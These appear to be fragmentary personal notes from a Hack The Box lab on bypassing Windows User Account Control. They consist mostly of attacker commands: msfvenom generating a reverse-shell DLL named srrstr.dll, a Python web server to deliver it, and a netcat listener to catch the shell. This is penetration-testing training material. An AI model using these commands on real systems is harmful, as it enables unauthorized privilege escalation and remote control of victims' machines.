- User Account Control (UAC) is a feature that allows for a non-administrator account to be given additional permissions to their token in order to run a certain program with elevated privileges. 
...
![[Pasted image 20251213081233.png]]
...
```shell-session
realCustampin@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
...
```shell-session
realCustampin@htb[/htb]$ sudo python3 -m http.server 8080
```
...
```shell-session
realCustampin@htb[/htb]$ nc -lvnp 8443
```
